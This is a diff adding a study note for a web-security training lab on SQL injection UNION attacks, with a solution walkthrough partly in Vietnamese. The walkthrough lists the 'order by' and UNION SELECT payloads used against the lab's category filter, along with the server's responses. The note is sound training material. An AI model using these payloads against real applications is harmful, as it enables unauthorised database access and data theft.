@@ -1,0 +1,49 @@
+1.Note:
+    A SQL injection UNION attack enables you to retrieve the results from an injected query. 
+    The interesting data that you want to retrieve is normally in string form. 
+    This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.
+
+    After you determine the number of required columns, you can probe each column to test whether it can hold string data.
+    You can submit a series of UNION SELECT payloads that place a string value into each column in turn. 
+    For example, if the query returns four columns, you would submit:
+
+        ' UNION SELECT 'a',NULL,NULL,NULL--
+        ' UNION SELECT NULL,'a',NULL,NULL--
+        ' UNION SELECT NULL,NULL,'a',NULL--
+        ' UNION SELECT NULL,NULL,NULL,'a'--
+    If the column data type is not compatible with string data, the injected query will cause a database error, such as:
+
+        Conversion failed when converting the varchar value 'a' to data type int.
+
+2.Lab
+    This lab contains a SQL injection vulnerability in the product category filter. 
+    The results from the query are returned in the application's response, 
+    so you can use a UNION attack to retrieve data from other tables. 
+    To construct such an attack, you first need to determine the number of columns returned by the query. 
+    You can do this using a technique you learned in a previous lab. 
+    The next step is to identify a column that is compatible with string data.
+
+    The lab will provide a random value that you need to make appear within the query results. 
+    To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. 
+    This technique helps you determine which columns are compatible with string data.
+
+3.submit
+    link: https://0a9400780321630a80f262fd003700c3.web-security-academy.net/filter?category=Gifts
+
+    Make the database retrieve the string: 'ZXmnnx'
+    
+    'ZXmnnx' Đây là giá trị dữ liệu cho trước để thực hiện truy vấn
+
+    Bước 1: Ta tìm số cột được truy vấn:
+        /filter?category=Gifts'+order+by+3--
+        =>> Vẫn ra kết quả
+        /filter?category=Gifts'+order+by+4--
+        =>>Internal Server Error
+        =>>Lỗi không có bảng nên suy ra số bảng được truy vấn là 3.
+     Bước 2: 
+        Thử lần 1:
+            /filter?category=Gifts'+union+select+'ZXmnnx',null,null--
+            =>> Internal Server Error
+        Thử lần 2:
+            /filter?category=Gifts'+union+select+null,'ZXmnnx',null--
+            =>> Solved
